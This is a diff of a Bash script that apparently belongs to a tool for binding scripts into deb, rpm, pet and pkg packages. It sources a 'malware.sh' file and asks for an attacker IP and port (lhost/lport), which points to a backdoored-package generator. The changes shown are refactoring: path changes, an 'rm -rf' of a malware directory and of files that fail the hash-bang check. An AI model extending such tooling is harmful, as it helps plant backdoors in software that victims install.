@@ -31,7 +31,17 @@ source ${PWD}/misc/globals.sh
 source ${PWD}/misc/utils.sh    
 source ${PWD}/misc/malware.sh
 
+
+source ${PWD}/misc/fromPackage.sh
+source ${PWD}/misc/debpackage.sh
+source ${PWD}/misc/rpmpackage.sh
+source ${PWD}/misc/petpackage.sh
+source ${PWD}/misc/pkgpackage.sh
+
+
 [ ! -o xpg_echo ] && shopt -s xpg_echo
+
+[[ -d './malware/' ]] && rm -rf ./malware/
 
 ###################################FUNCTIONS###################################
 #####CHECK IF USER IS ROOT
@@ -90,10 +100,8 @@ set_usage(){
     printf "Usage:- set lhost_lport [ip address of your computer] [any unfiltered port]\n"
 }
 
-source misc/debpackage.sh
-source misc/rpmpackage.sh
-source misc/petpackage.sh
-source misc/pkgpackage.sh
+
+
 
 
 ###CREATE SERVER BANNER FUNCTION
@@ -164,6 +172,7 @@ chk_file() {
     
     source ${CRYPT}/misc/crypt.sh
     source ${CRYPT}/misc/scriptconfig.sh
+    
     if [[ "${dirfile}" != "tempScript.sh" ]];then
 	while :;do
 	    
@@ -192,6 +201,7 @@ chk_file() {
 		#echo "#!${i}" > /dev/null 2>&1
 		head -1 "${bindscript}" | egrep -qo "#\!$i|$env.$i" #>/dev/null 2>&1
 		if [[ $? == 0 ]];then
+		    dirfile=${bindscript}
 		    break 2
 		fi
 		
@@ -200,17 +210,17 @@ chk_file() {
 	
 	    printf "${open}${bold}${red}%s${close}\n" "Hash bang is required in ${bindscript##*/}"
 	    
-	    if [[ -z "${dirfile}" ]];then
-		break ;
-	    fi
 	    cd ../../../../ && rm -rf "$dirfile"
-	    
+
 	    exit 2
 	    
 	done
-    else
-	bindscript="${dirfile}"
     fi
+
+
+
+    bindscript=${dirfile}
+
     
     fileExt=${bindscript##*.} ;# get the file extension
 
@@ -219,9 +229,9 @@ chk_file() {
 
     fileName=${bindscript%%.*}
     fileName=${fileName##*/}
-
-    cp "${bindscript}" "${fileName}" 
     
+    cp "${bindscript}" "${fileName}" 
+    cat $bindscript
     scrConfig "${fileExt}"
 
 }
